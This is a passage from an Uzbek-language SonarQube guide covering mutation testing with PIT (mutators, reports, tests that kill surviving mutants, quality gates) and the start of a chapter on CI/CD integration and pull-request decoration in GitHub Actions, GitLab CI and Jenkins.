bilan qarang: bitta ham `assert` yo'q.

```java
@ExtendWith(MockitoExtension.class)
class StockServiceTest {

    @Mock StockRepository repository;
    @InjectMocks StockService service;

    @Test
    void reserveIshlaydi() {
        // Uchta shox ham bosib o'tiladi, natija esa tekshirilmaydi
        when(repository.findBySku("A")).thenReturn(null);
        service.reserve("A", 1);

        when(repository.findBySku("B")).thenReturn(new StockItem("B", 5));
        service.reserve("B", 10);
        service.reserve("B", 5);
    }
}
```

JaCoCo bu to'plam uchun 100% ko'rsatadi. Sonar coverage shartidan o'tadi. Lekin
`quantity > item.available()` ni `>=` ga almashtirsangiz, test yana yashil
qoladi. `remaining` ni `item.available() + quantity` qilsangiz ham yashil.
Ya'ni bu to'plam regressiyani ushlamaydi.

Sonar bu holatning bir qismini ko'radi. `java:S2699` qoidasi test metodida
assertion yo'qligidan shikoyat qiladi. Lekin assertion bor, ammo bo'sh bo'lsa
(masalan `assertNotNull(result)`), Sonar jim qoladi. Shu yerdan mutation
testing boshlanadi.

### 20.2 Mutation testing g'oyasi: kodga kichik o'zgarish kiritib, test sezadimi deb tekshirish

Jarayon mexanik. Instrument kodning bytecode nusxasini oladi, bitta joyini
ataylab buzadi, keyin shu buzilgan nusxaga qarshi testlarni yuritadi. Buzilgan
nusxa mutant deyiladi.

Agar testlardan kamida bittasi qizil bo'lsa, mutant o'ldirilgan. Bu yaxshi
xabar: test shu xatti-harakatni haqiqatan ushlab turadi. Agar hamma test yashil
qolsa, mutant omon qolgan. Bu degani kodda shu nuqtada xatti-harakat o'zgarsa
ham sizning to'plamingiz bundan xabar bermaydi.

Mutation testing coverage ni almashtirmaydi, uning ustiga qo'yiladi. Qator
bajarilmagan bo'lsa, u yerdagi mutant ham ishga tushmaydi va hech narsa
o'lmaydi. Shuning uchun ketma-ketlik shunday: avval coverage, keyin mutation
score.

### 20.3 Mutant turlari: shart chegarasi, qaytish qiymati, matematik amal, chaqiruvni olib tashlash

PIT mutantlarni mutator deb atalgan qoidalar bilan yaratadi. Default to'plam
kichik va tez, kuchaytirilgan to'plam esa kengroq. Eng ko'p foyda beradigan
to'rt guruh quyidagicha.

| Mutator guruhi | Nima o'zgaradi | Qanday xatoni ochadi |
| --- | --- | --- |
| Conditionals boundary | `>` ni `>=`, `<` ni `<=` ga | Chegarada bir birlik xato |
| Negate conditionals | Shartni teskarisiga | Shox umuman tekshirilmaganini |
| Math | `+` ni `-`, `*` ni `/` ga | Hisob formulasi tekshirilmaganini |
| Return values | `true` ni `false`, obyektni `null` ga | Qaytish qiymati o'qilmaganini |
| Void method calls | Chaqiruvni butunlay olib tashlaydi | Yon ta'sir tekshirilmaganini |
| Increments | `i++` ni `i--` ga | Sanash mantiqi tekshirilmaganini |

Yuqoridagi `reserve` metodida PIT kamida beshta mutant yasaydi: `quantity >
item.available()` chegarasi, shu shartning inkori, `available() - quantity`
ayirmasi, `repository.updateAvailable(...)` chaqiruvining o'chirilishi va
`null` tekshiruvining inkori. Assertion yo'q test to'plami bu beshtasining
hammasini omon qoldiradi.

Alohida e'tibor beradigan mutator: void metod chaqiruvini olib tashlash.
To'lov servisida bu `auditLog.record(...)` yoki `eventPublisher.publish(...)`
chaqiruvini yo'q qiladi. Agar test bu chaqiruvni `verify` bilan tekshirmasa,
mutant omon qoladi. Amalda bu "biznes hodisasi yuborilmay qolsa ham CI yashil"
degani.

### 20.4 O'ldirilgan va omon qolgan mutant, mutation score ma'nosi

PIT har bir mutantga holat beradi. Asosiylari: KILLED (test qizil bo'ldi),
SURVIVED (hamma test yashil qoldi), NO_COVERAGE (mutant turgan qator umuman
bajarilmadi), TIMED_OUT (mutant cheksiz tsikl yasadi, bu ham o'lgan hisoblanadi)
va NON_VIABLE yoki MEMORY_ERROR kabi texnik holatlar.

Mutation score odatda shunday hisoblanadi: o'ldirilgan mutantlar soni bo'linadi
yaratilgan mutantlarning umumiy soniga. PIT hisobotida ikkinchi raqam ham bor:
test strength. U faqat coverage bilan qoplangan mutantlar ichidan nechtasi
o'ldirilganini ko'rsatadi. Bu ikkisi juftlikda o'qiladi.

Ikkisining farqi tashxis beradi. Mutation score past, test strength yuqori
bo'lsa, muammo coverage da: kod qismlari umuman test ko'rmagan. Ikkisi ham past
bo'lsa, muammo assertion larda: kod bajariladi, lekin natija tekshirilmaydi.
Birinchi holatni yangi test yozib, ikkinchisini borlarini kuchaytirib yopasiz.

100% mutation score maqsad emas. Ekvivalent mutant degan tushuncha bor: kodning
xatti-harakatini umuman o'zgartirmaydigan mutant. Masalan log satridagi
o'zgarish yoki keyin qayta yoziladigan o'zgaruvchi. Bunday mutantni o'ldirish
uchun yozilgan test implementatsiyaga yopishib qoladi va refactoring ni
qiyinlashtiradi.

### 20.5 PIT (pitest) ni Maven va Gradle da ishga tushirish

Maven da plugin `pom.xml` ga qo'shiladi. JUnit 5 uchun alohida plugin
dependency kerak, bu eng ko'p yo'l qo'yiladigan xato.

```xml
<plugin>
  <groupId>org.pitest</groupId>
  <artifactId>pitest-maven</artifactId>
  <version>1.17.0</version>
  <dependencies>
    <dependency>
      <!-- JUnit 5 uchun shart, bo'lmasa PIT testni ko'rmaydi -->
      <groupId>org.pitest</groupId>
      <artifactId>pitest-junit5-plugin</artifactId>
      <version>1.2.1</version>
    </dependency>
  </dependencies>
  <configuration>
    <targetClasses>
      <param>com.shop.order.domain.*</param>
    </targetClasses>
    <targetTests>
      <param>com.shop.order.domain.*Test</param>
    </targetTests>
    <mutationThreshold>70</mutationThreshold>
    <outputFormats>
      <param>HTML</param>
      <param>XML</param>
    </outputFormats>
    <timestampedReports>false</timestampedReports>
  </configuration>
</plugin>
```

Ishga tushirish buyruqlari. Versiya raqamlari o'zgaradi, shuning uchun
`pitest-maven` va `pitest-junit5-plugin` mosligini har yangilashda tekshirish
kerak.

```bash
# Maven: mutation testing ni yuritish va hisobotni yasash
mvn -B test-compile org.pitest:pitest-maven:mutationCoverage

# Faqat o'zgargan kod uchun, git tarixiga tayanib
mvn -B org.pitest:pitest-maven:scmMutationCoverage \
    -Dinclude=ADDED,MODIFIED \
    -DanalyseLastCommit=true

# Gradle: plugin qo'shilgandan keyin
./gradlew pitest

# Hisobot joyi
ls target/pit-reports/index.html
ls build/reports/pitest/index.html
```

Gradle da `id 'info.solidsoft.pitest' version '1.15.0'` plugin i ishlatiladi.
Uning ichida `junit5PluginVersion`, `targetClasses` va `mutationThreshold`
xuddi Maven dagidek sozlanadi. Spring Boot loyihada `threads` ni protsessor
yadrosi sonidan kichik qo'yish tavsiya qilinadi, aks holda integratsion
testlar bir-biriga xalaqit beradi.

### 20.6 Hisobotni o'qish: qaysi mutant omon qolgan va bu nimani bildiradi

HTML hisobot klass bo'yicha ro'yxat beradi. Klassni ochsangiz, kod yonida
rangli qatorlar turadi: yashil qator mutantlari o'ldirilgan, qizil qator
mutantlari omon qolgan. Har bir qatorning oxirida mutant tavsifi yoziladi,
masalan "changed conditional boundary" yoki "removed call to
com/shop/audit/AuditLog::record".

Omon qolgan mutant uchta xabarning bittasini beradi. Birinchisi: haqiqiy test
bo'shligi, bu yerda xatti-harakat tekshirilmaydi va buni yopish kerak.
Ikkinchisi: mutant xatti-harakatga ta'sir qilmaydi, ya'ni ekvivalent, bu yerda
hech narsa qilmaslik to'g'ri. Uchinchisi: kod o'zi keraksiz, masalan hech qachon
`false` bo'lmaydigan himoya sharti, bu yerda kodni o'chirish eng yaxshi javob.

XML hisobot CI uchun kerak. Undan omon qolganlar sonini olish oson.

```bash
# PIT XML hisobotidan omon qolgan mutantlarni sanash
REPORT=target/pit-reports/mutations.xml

SURVIVED=$(grep -c 'status="SURVIVED"' "$REPORT" || true)
NO_COV=$(grep -c 'status="NO_COVERAGE"' "$REPORT" || true)
KILLED=$(grep -c 'status="KILLED"' "$REPORT" || true)

echo "o'ldirilgan=$KILLED omon=$SURVIVED qoplanmagan=$NO_COV"

# Omon qolganlarning klass va qatorini ko'rish
grep 'status="SURVIVED"' "$REPORT" \
  | sed -E 's/.*<mutatedClass>([^<]+).*<lineNumber>([0-9]+).*/\1:\2/' \
  | sort | uniq -c | sort -rn | head -20
```

### 20.7 Omon qolgan mutantni test bilan yopish amaliyoti

Omon qolgan mutantni yopish uchun yangi test turi emas, aniqroq assertion
kerak. Yuqoridagi `reserve` metodi uchun chegara mutantini o'ldiradigan test
shunday bo'ladi.

```java
@ParameterizedTest
@CsvSource({
    // qoldiq, so'rov, kutilgan holat
    "5, 4, ACCEPTED",
    "5, 5, ACCEPTED",   // aynan chegara, `>` va `>=` ni ajratadi
    "5, 6, REJECTED"
})
void chegaraAniqTekshiriladi(int available, int requested, Status expected) {
    when(repository.findBySku("SKU-1"))
        .thenReturn(new StockItem("SKU-1", available));

    ReservationResult result = service.reserve("SKU-1", requested);

    assertThat(result.status()).isEqualTo(expected);
    if (expected == Status.ACCEPTED) {
        // matematik mutantni o'ldiradi
        assertThat(result.remaining()).isEqualTo(available - requested);
        // chaqiruvni olib tashlash mutantini o'ldiradi
        verify(repository).updateAvailable("SKU-1", available - requested);
    } else {
        verify(repository, never()).updateAvailable(any(), anyInt());
    }
}
```

Bu bitta testda to'rtta mutant o'ladi: chegara, inkor, ayirma va repository
chaqiruvi. Qoida sodda: chegaraning ikki tomonini va aynan chegara qiymatini
bering, qaytish qiymatining mazmunini tekshiring, yon ta'sirni `verify` bilan
qulflang.

| Tuzoq | Nega yomon | Yechim |
| --- | --- | --- |
| `assertNotNull(result)` bilan tugash | Deyarli hamma mutant omon qoladi | Qiymatni aniq kutilgan bilan solishtirish |
| Faqat "happy path" ma'lumoti | Chegara mutantlari o'lmaydi | Chegaraning ikki tomoni va o'zi |
| `verify` siz mock | Chaqiruvni olib tashlash omon qoladi | Muhim yon ta'sirga `verify` |
| Kutilgan qiymatni formuladan hisoblash | Mutant formulani ham buzadi | Testda qattiq raqam yozish |
| Bitta katta test metodi | Qaysi assertion ishlaganini bilmaysiz | Parametrli yoki ajratilgan testlar |
| Log va getter ni ham quvish | Ekvivalent mutant ortidan yurish | Bunday mutantni e'tiborsiz qoldirish |

### 20.8 Mutation testing narxi: vaqt va uni qisqartirish usullari

Narx formulasi oddiy: har bir mutant uchun unga tegishli testlar qayta
yuritiladi. Agar klassda 40 mutant va 20 ta tezkor test bo'lsa, bu minglab test
bajarilishi. Spring context ko'targan testlar bilan birga bu soatlarga cho'ziladi.

Vaqtni qisqartirishning amaliy usullari quyidagicha. Birinchisi: `targetClasses`
ni faqat domen va biznes paketlariga cheklash, controller va konfiguratsiya
klasslarini chiqarib tashlash. Ikkinchisi: Spring context ko'taradigan
integratsion testlarni `excludedTestClasses` bilan chiqarib tashlash, chunki
mutation testing uchun tezkor unit testlar kifoya. Uchinchisi: `threads` ni
oshirish. To'rtinchisi: `timeoutConstant` ni mantiqli qiymatda ushlab turish.

Eng muhim usul: har commit da butun loyihani emas, faqat o'zgargan kodni
tahlil qilish. `scmMutationCoverage` goal i aynan shu uchun. Kechasi esa to'liq
yurish qoldiriladi.

```yaml
# CI da ikki rejim: PR uchun tez, kechasi uchun to'liq
jobs:
  pitest-pr:
    if: github.event_name == 'pull_request'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0   # scm rejimi uchun tarix kerak
      - uses: actions/setup-java@v4
        with:
          java-version: '21'
          distribution: temurin
      - run: >
          mvn -B test-compile
          org.pitest:pitest-maven:scmMutationCoverage
          -Dinclude=ADDED,MODIFIED

  pitest-nightly:
    if: github.event_name == 'schedule'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: mvn -B test-compile org.pitest:pitest-maven:mutationCoverage
```

### 20.9 Qaysi modulga mutation testing qo'llash mantiqiy

Mutation testing hamma joyda bir xil foyda bermaydi. U mantiq zich bo'lgan
joyda kuchli, ko'chirib beruvchi kodda kuchsiz.

Foyda yuqori bo'ladigan joylar: narx va chegirma hisoblash, soliq va komissiya,
to'lov holati mashinasi, ombor qoldig'i va rezerv, limit va kvota tekshiruvlari,
validatsiya qoidalari, retry va timeout qarorlari. Bu yerlarda bitta operator
xatosi puldagi xatoga aylanadi.

Foyda past bo'ladigan joylar: DTO va mapper, `@Configuration` klasslari,
`@Controller` dagi yupqa delegatsiya, repository interfeyslari, generatsiya
qilingan kod. Bu yerlarda PIT ko'p mutant yasaydi va ko'pi ekvivalent chiqadi,
natijada shovqin paydo bo'ladi.

```properties
# pitest.properties yoki pom profilidagi sozlama mazmuni
# Faqat mantiq zich paketlar
pitest.targetClasses=com.shop.pricing.*, com.shop.order.domain.*, com.shop.stock.domain.*
# Mapper va konfiguratsiya chiqariladi
pitest.excludedClasses=*Mapper, *Config, *Dto, *Request, *Response
# Spring context ko'taradigan testlar chiqariladi
pitest.excludedTestClasses=*IT, *IntegrationTest
# Lombok va generatsiya qilingan kodni e'tiborsiz qoldirish
pitest.avoidCallsTo=org.slf4j, java.util.logging
pitest.mutationThreshold=75
pitest.coverageThreshold=80
```

### 20.10 Mutation score ni quality gate ga qo'shish masalasi

Bu yerda halol bo'lish kerak. SonarQube o'zining standart metrikalari ichida
mutation score ni o'lchamaydi. Sonar coverage ni JaCoCo hisobotidan oladi, PIT
hisobotini esa standart holatda umuman o'qimaydi. Mutation score ni Sonar
quality gate shartiga aylantirish uchun uchta yo'ldan birini tanlaysiz.

Birinchi yo'l: PIT ning o'z `mutationThreshold` sozlamasi. Bu Sonar dan mustaqil
ishlaydi va threshold dan past bo'lsa build ni yiqitadi. Eng sodda va eng
ishonchli variant.

Ikkinchi yo'l: PIT natijasini Sonar ichiga olib kiradigan community plugin.
Bunday plugin tarixda bor edi va u Sonar versiyalari bilan har doim mos
kelmaydi. Shuning uchun uni ishlatish oldidan o'z Sonar versiyangiz bilan
moslikni tekshiring, va bu bog'liqlik ustida kritik gate qurmang.

Uchinchi yo'l: CI pipeline da alohida qadam. PIT XML hisobotidan score
hisoblanadi, chegaradan past bo'lsa pipeline to'xtaydi. Sonar quality gate va
mutation gate bir-biridan mustaqil ikki darvoza bo'ladi. Ko'p jamoada aynan shu
variant barqaror chiqadi.

```bash
# Mustaqil mutation gate: PIT XML dan score hisoblash
set -euo pipefail
REPORT=target/pit-reports/mutations.xml
MIN=70

TOTAL=$(grep -o '<mutation ' "$REPORT" | wc -l)
KILLED=$(grep -o 'status="KILLED"' "$REPORT" | wc -l)
TIMEOUT=$(grep -o 'status="TIMED_OUT"' "$REPORT" | wc -l)

SCORE=$(( (KILLED + TIMEOUT) * 100 / TOTAL ))
echo "mutation score = ${SCORE}% (chegara ${MIN}%)"

if [ "$SCORE" -lt "$MIN" ]; then
  echo "Mutation gate yiqildi" >&2
  exit 1
fi
```

Qanday chegara qo'yish kerak. Yangi loyihada 70 dan 80 gacha mantiqli. Eski
loyihada avval o'lchang, keyin hozirgi raqamni chegara qilib qotirib qo'ying va
uni pasaytirishga ruxsat bermang. Ya'ni Sonar dagi "new code" mantiqining
mutation score uchun qo'lda qilingan varianti.

### 20.11 Coverage va mutation score ni birga o'qish

Ikki raqam birga o'qilganda tashxis beradi. Alohida o'qilganda ikkisi ham
chalg'itadi.

| Holat | Ma'nosi | Birinchi qadam |
| --- | --- | --- |
| Coverage past, score past | Test deyarli yo'q | Kritik yo'llarga test yozish |
| Coverage yuqori, score past | Assertion yo'q yoki bo'sh | Borlarini kuchaytirish |
| Coverage yuqori, score yuqori | Sog'lom to'plam | Yangi kodda ushlab turish |
| Coverage past, score yuqori | Test oz, lekin kuchli | Qoplanmagan joyni kengaytirish |

| Savol | Oddiy yondashuv | Arxitektor yondashuvi |
| --- | --- | --- |
| Test sifati o'lchovi | Coverage foizi | Coverage va mutation score juftligi |
| Coverage maqsadi | 100% ga intilish | Mantiq zich kodda yuqori, mapper da past |
| Assertion | Natija `null` emasligini tekshirish | Kutilgan qiymat va yon ta'sirni qulflash |
| Chegara sharti | Bitta "happy path" misoli | Chegaraning ikki tomoni va o'zi |
| Mock tekshiruvi | `when` bilan cheklanish | Muhim chaqiruvga `verify` |
| PIT ni qachon yuritish | Hech qachon yoki qo'lda | PR da o'zgargan kodga, kechasi to'liq |
| PIT qamrovi | Butun loyiha | Domen va biznes paketlari |
| Mutation gate | Yo'q yoki Sonar plugin iga tayanish | PIT threshold yoki mustaqil CI qadami |
| Omon qolgan mutant | Hammasini quvish | Xatti-harakatga ta'sir qiladiganini quvish |
| Chegara qo'yish | Kitobdagi raqam | O'lchangan hozirgi daraja, pasaymaslik sharti |

Coverage va mutation score ni Sonar dagi quality gate bilan birga ko'rish uchun
hisobot yo'llarini bir joyda sozlash qulay.

```properties
# sonar-project.properties: Sonar coverage ni JaCoCo dan oladi
sonar.projectKey=shop-order
sonar.sources=src/main/java
sonar.tests=src/test/java
sonar.java.binaries=target/classes
# JaCoCo XML, Sonar buni o'qiydi
sonar.coverage.jacoco.xmlReportPaths=target/site/jacoco/jacoco.xml
# Mapper va DTO ni coverage hisobidan chiqarish
sonar.coverage.exclusions=**/dto/**,**/config/**,**/*Mapper.java
# PIT hisoboti Sonar uchun emas, jamoa o'qishi uchun artefakt
# pit.report.path=target/pit-reports/index.html
```

Oxirgi fikr. Mutation testing ni metrika poygasi sifatida kiritish zararli.
Uni tashxis asbobi sifatida kiritish foydali. Omon qolgan mutant ro'yxati
jamoaga "bu yerda nima buzilsa ham biz bilmaymiz" degan aniq ro'yxat beradi.
Shu ro'yxatning kritik qismini yopsangiz, coverage raqami o'zgarmasa ham
to'plamning haqiqiy qiymati o'sadi.

Test yozish texnikasining o'zi, parametrli testlar va mock strategiyasi
testlash qo'llanmasidagi unit test va test ma'lumotlari mavzularida.

### 20.12 Amalda qo'llash

- [ ] Eng muhim bitta domen paketini tanlang va unga PIT ni ulang, Maven da
  `pitest-junit5-plugin` dependency sini qo'shishni unutmang.
- [ ] Birinchi to'liq yurishni qo'lda bajarib, hozirgi mutation score va test
  strength raqamlarini yozib oling.
- [ ] HTML hisobotdan omon qolgan mutantlarni uchga ajratib belgilang: test
  bo'shligi, ekvivalent, keraksiz kod.
- [ ] Chegara sharti bilan bog'liq omon qolgan mutantlarni parametrli test
  bilan yoping, chegaraning ikki tomoni va aynan chegara qiymatini bering.
- [ ] Void chaqiruvni olib tashlash mutantlarini `verify` bilan yopib, biznes
  hodisasi yuborilishini qulflang.
- [ ] `targetClasses` va `excludedTestClasses` ni sozlab, Spring context
  ko'taradigan testlarni mutation yurishidan chiqarib tashlang.
- [ ] PR uchun `scmMutationCoverage`, kechasi uchun to'liq yurishni CI ga
  ikki alohida job qilib qo'ying.
- [ ] Hozirgi o'lchangan score ni chegara qilib qotiring va uni pasaytirmaslik
  shartini pipeline ga mustaqil qadam sifatida kiritib qo'ying.


# VI. Amaliyot va jarayon

## 21. CI/CD ga ulash, PR decoration va blokirovka (CI/CD Integration)

SonarQube lokal kompyuterda ishga tushganda foyda beradi, lekin haqiqiy kuchi CI pipeline ichida ochiladi. Faqat o'sha joyda tahlil har bir commit uchun avtomatik bajariladi va quality gate natijasi merge qarorini boshqaradi. Bu bobda tahlilni pipeline ga qanday tartibda qo'yish, pull request natijasini qayerda ko'rish va qaysi texnik tuzoqlar eng ko'p vaqt yo'qotishini ko'rib chiqamiz. Test turlarini qanday yozish va CI da umuman qanday pipeline qurish masalasi testlash qo'llanmasidagi CI/CD test pipeline mavzusida, bu yerda faqat Sonar qismi.

### 21.1 Pipeline dagi to'g'ri tartib: qurish, test, coverage hisoboti, tahlil, gate kutish

Sonar testni o'zi ishga tushirmaydi. U faqat tayyor hisobotlarni o'qiydi. Shuning uchun tartib qat'iy: avval kod kompilyatsiya qilinadi, keyin testlar bajariladi, keyin JaCoCo XML hisoboti yoziladi, keyin tahlil yuboriladi, eng oxirida quality gate natijasi kutiladi.

Eng ko'p uchraydigan xato shu tartibni buzish. Agar `sonar:sonar` testlardan oldin ishga tushsa, JaCoCo XML fayli hali yo'q bo'ladi. Sonar bunda xato bermaydi. U shunchaki coverage ni 0 foiz deb yozadi. Natijada quality gate "Coverage on New Code" shartida yiqiladi va jamoa sababni kod ichida qidiradi.

Ikkinchi xato: test bilan tahlil orasida `mvn clean` ishlatish. Bu `target` katalogini o'chiradi. Sonar `target/classes` ichidagi bytecode ni ham o'qiydi, chunki Java tahlili uchun kompilyatsiya natijasi kerak. Bytecode yo'qolsa tahlil sifati pasayadi yoki butunlay uziladi.

Uchinchi xato: coverage hisobotini `prepare-agent` bilan bog'lab, `report` goal ini esdan chiqarish. JaCoCo agent `.exec` binary fayl yozadi. Sonar esa XML kutadi. XML ni `report` goal yaratadi.

| Masala | Oddiy yondashuv | Arxitektor yondashuvi |
| --- | --- | --- |
| Tahlil joyi | Developer lokalda qo'lda ishga tushiradi | Har commit da CI da avtomatik, lokal faqat tekshiruv uchun |
| Tartib | `sonar:sonar` ni mustaqil qadam deb biladi | `verify` dan keyin, `clean` dan oldin, bir workspace ichida |
| Coverage | JaCoCo agent yoqilgan, XML hisoboti yo'q | `report` goal majburiy, XML yo'li aniq ko'rsatilgan |
| Gate | Natija Sonar UI da qoladi, build yashil | `sonar.qualitygate.wait` build ni yiqitadi |
| Merge bloklash | "Hammaga aytdik, qoidani buzmaslik kerak" | Branch protection da Sonar check majburiy qilingan |
| Token | Repository da plain text yoki pom.xml ichida | CI secret store da, loyiha darajasidagi analysis token |
| Git tarixi | Default shallow clone | `fetch-depth: 0`, blame ishlasin |
| Fork PR | Tahlil jim yiqiladi, hech kim sezmaydi | Fork aniqlanadi, qadam ataylab o'tkazib yuboriladi va sabab yoziladi |
| Nosozlik | Gate yiqilsa `continue-on-error` qo'yiladi | Infratuzilma xatosi va gate xatosi ajratiladi |
| Tezlik | Har build da to'liq tahlil, kesh yo'q | `~/.m2` va `~/.sonar/cache` keshlanadi, exclusions sozlangan |

### 21.2 GitHub Actions da sozlash: qadamlar, kesh, token saqlash

GitHub Actions da eng ishonchli yo'l Maven loyihasi uchun `sonar-maven-plugin` ni to'g'ridan to'g'ri ishlatish. Alohida scanner action ham bor, lekin Maven loyihasida plugin modul strukturasini, classpath ni va test hisobotlarini o'zi topadi.

```yaml
name: ci-sonar
on:
  push:
    branches: [main, 'release/**']
  pull_request:
    types: [opened, synchronize, reopened]
jobs:
  verify:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0            # blame uchun to'liq git tarixi kerak
      - uses: actions/setup-java@v4
        with:
          java-version: '21'
          distribution: temurin
          cache: maven              # ~/.m2 keshi avtomatik
      - name: Test va coverage hisoboti
        run: mvn -B -ntp verify     # jacoco XML shu bosqichda yoziladi
      - name: Sonar tahlili va gate
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
          SONAR_HOST_URL: ${{ vars.SONAR_HOST_URL }}
        run: >
          mvn -B -ntp sonar:sonar
          -Dsonar.projectKey=payment-service
          -Dsonar.qualitygate.wait=true
```

Bu workflow ikki mustaqil `mvn` chaqiruvidan iborat. Sababi oddiy: test yiqilsa xato "test" qadamida ko'rinadi, gate yiqilsa "Sonar" qadamida. Bitta buyruqqa qo'shib yozsa ham ishlaydi, lekin log da sabab aralashib ketadi.

Plugin versiyasini pom.xml da qotirish kerak. Aks holda `mvn sonar:sonar` har build da eng yangi versiyani tortadi va bir kuni kutilmaganda xatti harakat o'zgaradi.

```xml
<properties>
  <!-- versiyalar qotirilgan, build takrorlanadigan bo'lsin -->
  <sonar.maven.version>4.0.0.4121</sonar.maven.version>
  <jacoco.version>0.8.12</jacoco.version>
  <!-- Sonar XML hisobotni shu yo'ldan o'qiydi -->
  <sonar.coverage.jacoco.xmlReportPaths>
    ${project.build.directory}/site/jacoco/jacoco.xml
  </sonar.coverage.jacoco.xmlReportPaths>
</properties>
<build><plugins>
  <plugin>
    <groupId>org.jacoco</groupId>
    <artifactId>jacoco-maven-plugin</artifactId>
    <version>${jacoco.version}</version>
    <executions>
      <execution><id>agent</id><goals><goal>prepare-agent</goal></goals></execution>
      <!-- report goal bo'lmasa XML chiqmaydi va coverage 0 bo'ladi -->
      <execution><id>report</id><phase>verify</phase>
        <goals><goal>report</goal></goals></execution>
    </executions>
  </plugin>
  <plugin>
    <groupId>org.sonarsource.scanner.maven</groupId>
    <artifactId>sonar-maven-plugin</artifactId>
    <version>${sonar.maven.version}</version>
  </plugin>
</plugins></build>
```

Yuqoridagi versiya raqamlari misol uchun. Loyihada ularni o'z muhitingizdagi mavjud versiyaga moslang, chunki plugin versiyasi SonarQube server versiyasiga bog'liq.

### 21.3 GitLab CI va Jenkins da sozlashning farqlari

GitLab CI da ikkita qo'shimcha narsa bor. Birinchisi `GIT_DEPTH`. GitLab default holda qisqartirilgan clone qiladi, shuning uchun uni 0 ga qo'yish kerak. Ikkinchisi merge request pipeline: tahlil MR kontekstida ishlashi uchun `rules` to'g'ri yozilishi shart.

```yaml
variables:
  GIT_DEPTH: "0"                      # shallow clone o'chirildi
  SONAR_USER_HOME: "${CI_PROJECT_DIR}/.sonar"
  MAVEN_OPTS: "-Dmaven.repo.local=${CI_PROJECT_DIR}/.m2/repository"
cache:
  key: "sonar-$CI_COMMIT_REF_SLUG"
  paths:
    - .sonar/cache                    # scanner plugin keshi
    - .m2/repository
sonar:
  stage: test
  image: maven:3.9-eclipse-temurin-21
  script:
    - mvn -B -ntp verify
    - mvn -B -ntp sonar:sonar -Dsonar.qualitygate.wait=true
  rules:
    # MR pipeline da ham, default branch da ham ishlasin
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
  allow_failure: false
```

Jenkins da farq kattaroq. Token va server manzilini qo'lda uzatish o'rniga SonarQube Scanner plugin ning `withSonarQubeEnv` bloki ishlatiladi. U kerakli muhit o'zgaruvchilarini o'zi joylaydi. Gate kutish esa `waitForQualityGate` step bilan amalga oshadi va bu step SonarQube serverdan Jenkins ga keladigan webhook ga tayanadi. Webhook sozlanmagan bo'lsa step cheksiz kutadi va timeout da yiqiladi.

```groovy
pipeline {
  agent any
  stages {
    stage('Build va test') {
      steps { sh 'mvn -B -ntp verify' }
    }
    stage('Sonar tahlili') {
      steps {
        // plugin SONAR_HOST_URL va token ni o'zi joylaydi
        withSonarQubeEnv('sonarqube-prod') {
          sh 'mvn -B -ntp sonar:sonar'
        }
      }
    }
    stage('Quality gate') {
      steps {
        // webhook orqali natija keladi, timeout majburiy
        timeout(time: 10, unit: 'MINUTES') {
          waitForQualityGate abortPipeline: true
        }
      }
    }
  }
}
```

Jenkins da PR ni avtomatik aniqlash uchun Multibranch Pipeline yoki GitHub Branch Source plugin kerak. Oddiy freestyle job da scanner PR kontekstini topa olmaydi va `sonar.pullrequest.*` parametrlarini qo'lda berish kerak bo'ladi.

### 21.4 Pull request tahlili: qanday ulanadi va natija qayerda ko'rinadi

Scanner mashhur CI tizimlarining muhit o'zgaruvchilarini o'qib, PR kontekstini o'zi aniqlaydi. GitHub Actions, GitLab CI, Azure Pipelines va Bitbucket uchun bu avtomatik ishlaydi. Shunda scanner uchta parametrni to'ldiradi: PR raqami, manba branch nomi va maqsad branch nomi.

Agar avtomatik aniqlash ishlamasa, parametrlarni qo'lda berish mumkin. Ularni properties fayliga yozish emas, CI da dinamik uzatish to'g'ri, chunki qiymatlar har PR da boshqacha.

```properties
# faqat avtomatik aniqlash ishlamaganda qo'lda beriladi
sonar.pullrequest.key=1482
sonar.pullrequest.branch=feature/refund-partial
sonar.pullrequest.base=main

# monorepo da har modul o'z projectKey siga ega bo'lsin
sonar.projectKey=orders-service
sonar.projectName=Orders Service

# generatsiya qilingan kod tahlildan chiqariladi
sonar.exclusions=**/generated/**,**/target/**,**/*MapperImpl.java
sonar.coverage.exclusions=**/config/**,**/*Application.java
```

Server tomonda PR alohida yozuv sifatida saqlanadi. U main branch tarixini buzmaydi. Natija SonarQube UI da loyihaning "Pull Requests" bo'limida ko'rinadi. U yerda faqat PR o'zgartirgan qatorlar bo'yicha issue lar va new code coverage ko'rsatiladi.

Muhim cheklov: branch va pull request tahlili SonarQube ning pullik nashrlaridan boshlab mavjud. Community nashrida odatda faqat bitta asosiy branch tahlil qilinadi. Shuning uchun Community da ishlayotgan jamoa PR decoration ni kutmasin. Bu yerda realistik strategiya: main branch ga merge qilingandan keyin tahlil va gate ishlaydi, PR bosqichida esa lokal tekshiruv va kod ko'rigi ishlatiladi.

### 21.5 PR decoration: izohlar, holat belgisi va merge ni bloklash

PR decoration server tomonda sozlanadi, CI da emas. Buning uchun SonarQube da ALM integration yoziladi: GitHub uchun GitHub App yoki token, GitLab uchun api scope li token. Keyin har bir loyiha o'sha integration ga va aniq repository ga bog'lanadi. Bog'lanish yo'q bo'lsa tahlil muvaffaqiyatli o'tadi, lekin PR da hech qanday izoh paydo bo'lmaydi.

Decoration uch ko'rinishda keladi. Birinchisi PR ga yoziladigan umumiy xulosa izohi: nechta yangi issue, new code coverage va duplication foizi. Ikkinchisi aniq qatorlarga qo'yiladigan inline izohlar. Uchinchisi PR check holati, ya'ni yashil yoki qizil belgi.

Merge ni Sonar o'zi bloklamaydi. Bu juda muhim nuqta. Sonar faqat check holatini yuboradi. Merge ni bloklash GitHub tomonda branch protection rule yoki ruleset bilan qilinadi: Sonar check ni "required status check" ro'yxatiga qo'shish kerak. GitLab da esa MR ni bloklash uchun pipeline muvaffaqiyatli bo'lishi talab qilinadi va Sonar job `allow_failure: false` bo'lishi shart.

Shundan kelib chiqadigan amaliy xulosa: gate ni qattiq qilish uchun ikkita mustaqil sozlama kerak. Bittasi Sonar tomonda quality gate shartlari. Ikkinchisi Git platformasi tomonda check ni majburiy qilish. Faqat bittasini qilish bloklash illyuziyasini beradi.

